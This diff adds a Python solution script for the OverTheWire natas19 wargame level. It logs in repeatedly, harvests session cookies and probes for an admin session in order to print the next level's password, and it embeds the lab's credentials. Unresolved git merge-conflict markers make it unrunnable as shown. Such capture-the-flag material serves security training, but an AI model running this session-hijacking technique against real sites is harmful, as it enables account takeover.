@@ -1,0 +1,58 @@
+import requests
+import json
+<<<<<<< HEAD
+=======
+import binascii
+>>>>>>> 76a57d4f06d8b0cca49e29793421a7e50c315cbe
+
+url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"
+
+max_id = 640
+admin_suffix = "d61646d696e"
+
+prefixes = []
+count = 0
+
+
+while True:
+	try :
+		# Retrieve valid cookie by login in
+		s = requests.Session()
+<<<<<<< HEAD
+		r = s.post(url, data={'username':'admin', 'password':'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'})
+=======
+		r = s.post(url, data={'username':'admin', 'password':'a'})
+>>>>>>> 76a57d4f06d8b0cca49e29793421a7e50c315cbe
+		session_id = list(r.cookies.get_dict().values())[0]
+
+		prefix = session_id.replace(admin_suffix, '')
+		prefixes.append(prefix)
+
+		# Try to access page with the cookie
+		r = s.get(url)
+
+		invalid_session = "Please login" in r.text
+		regular_user = "regular user" in r.text
+<<<<<<< HEAD
+		print(f"[{count}] Trying session id {session_id} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")
+=======
+		print(f"[{count}] Trying session id {session_id} -- {binascii.unhexlify(session_id).decode('utf-8')} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")
+>>>>>>> 76a57d4f06d8b0cca49e29793421a7e50c315cbe
+
+		if not regular_user and not invalid_session:
+			print("Found valid session id !")
+			print(r.text)
+			password = r.text.split('Password: ')[1].split("</pre>")[0]
+			print(f"Natas20 password is {password}")
+			break
+
+		s.close()
+		count += 1
+
+	except KeyboardInterrupt:
+		break
+
+
+with open('prefixes.json', 'w') as f:
+	json.dump(prefixes, f)
+
